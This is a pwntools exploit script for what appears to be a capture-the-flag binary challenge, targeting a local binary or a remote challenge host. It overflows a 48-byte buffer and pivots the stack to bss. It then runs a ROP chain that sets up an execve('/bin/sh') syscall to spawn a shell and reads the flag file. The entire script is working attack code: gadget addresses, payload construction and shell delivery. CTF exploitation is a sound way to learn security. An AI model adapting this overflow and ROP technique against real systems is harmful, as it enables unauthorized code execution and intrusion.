from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote(
    "chal.78727867.xyz", 34000)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


"""
0x0000000000403a44 : pop rdi ; pop rbp ; ret
0x0000000000403d5a : pop rsi ; pop rbp ; ret
0x00000000004297c3 : pop rax ; ret
0x0000000000401ed0 : pop rdx ; ret 7
"""
bss = 0x04A9AA0 + 0x200
pop_rdi = 0x403a44
pop_rdx = 0x401ed0
pop_rax = 0x4297c3
pop_rsi = 0x403d5a
leave_ret = 0x040312C
syscall = 0x4036D7

payload = b"\x00" * 48 + p64(bss)
payload += p64(0x4030DC)

binstr = 0x4a9c70
# payload += p64(pop_rdx) + p64(2)
# payload += p64(pop_rdi) + p64(1) + p64(0)
ddebug("break *0x40312C\ncontinue")
io.sendlineafter("your name?", payload)

payload = b"/bin/sh"
payload = payload.ljust(48, b"\x00")
payload += p64(bss)
payload += p64(pop_rdi)
payload += p64(binstr) + p64(0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rsi)
payload += p64(0) + p64(0)
payload += p64(syscall)
io.sendline(payload)
io.sendline(b"cat /home/ctf/flag.txt")
io.interactive()
